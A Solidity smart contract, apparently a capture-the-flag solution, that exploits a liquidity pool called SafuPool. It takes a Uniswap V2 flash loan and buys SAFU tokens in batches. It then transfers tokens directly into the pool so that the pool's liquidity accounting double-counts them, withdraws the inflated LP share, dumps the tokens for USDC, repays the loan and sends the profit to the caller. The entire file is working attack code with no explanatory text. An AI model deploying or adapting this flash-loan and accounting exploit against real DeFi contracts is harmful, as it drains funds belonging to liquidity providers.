// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";


interface IUniswapV2Pair {
    function swap(
        uint amount0Out, 
        uint amount1Out, 
        address to, 
        bytes calldata data
    ) external;
}

interface ISafuPool {
    function addLiquidity(uint256 _baseAmount, uint256 _tokenAmount) external returns (uint);
    function swap(address toToken, uint256 amount) external returns (uint);
    function removeAllLiquidity() external returns (uint, uint);
    function approve(address, uint256) external returns (bool);
}

/// @dev Exploiter contract for SafuPool
contract SwapperExploiter {

    IUniswapV2Pair pair;
    ISafuPool safuPool;
    IERC20 usdc;
    IERC20 safu;

    /// @dev Runs exploit, flashloan borrows Uniswap USDC liq
    function runExploit(
        address _uniswapPair, // DAI-USDC pair
        address _safuPool,
        address _usdc,
        address _safu,
        uint256 amount // flashloan amount required
    ) external {
        pair = IUniswapV2Pair(_uniswapPair);
        safuPool = ISafuPool(_safuPool);
        usdc = IERC20(_usdc);
        safu = IERC20(_safu);

        usdc.approve(address(safuPool),type(uint256).max);
        safu.approve(address(safuPool),type(uint256).max);

        pair.swap(amount,0,address(this),bytes('not empty'));
    }

    /// @dev Uniswap flashloan callback
    /// @dev Swaps done in batches b/c extra fees for large swaps
    function uniswapV2Call(
        address _sender, 
        uint256 _amount0, // usdc
        uint256 _amount1,
        bytes calldata _data
    ) external {
        require(msg.sender == address(pair), 'callback');

        for (uint i=0; i<5; ++i) {
            safuPool.swap(address(safu),8_000*1e18); // get some SAFU tokens
        }

        uint256 safuAmount = safu.balanceOf(address(this));
        safuPool.addLiquidity(safuAmount, safuAmount); // add equal parts tokens for liq

        for (uint i=0; i<5; ++i) {
            safuPool.swap(address(safu),8_000*1e18); // get more SAFU tokens
        }

        safuAmount = safu.balanceOf(address(this));
        safu.transfer(address(safuPool),safuAmount); // transfer all SAFU
        usdc.transfer(address(safuPool),600_000*1e18); // transfer large amount of USDC

        safuPool.removeAllLiquidity(); // effectively double counts the transfers done earlier
        safuPool.addLiquidity(0,0); // get LP which is the double counted
        safuPool.removeAllLiquidity(); // get base funds for the double counted LP

        uint256 amountPerRound = safu.balanceOf(address(this)) / 10;

        for (uint i=0; i<10; ++i) {
            safuPool.swap(address(usdc), amountPerRound); // dump remaining SAFU for USDC
        }

        uint256 loanPlusInterest = (_amount0*(10**18)*1000/997/(10**18))+1; // exact amount owed
        usdc.transfer(msg.sender,loanPlusInterest); // pay back flashloan
        usdc.transfer(tx.origin,usdc.balanceOf(address(this))); // lazy
    }

}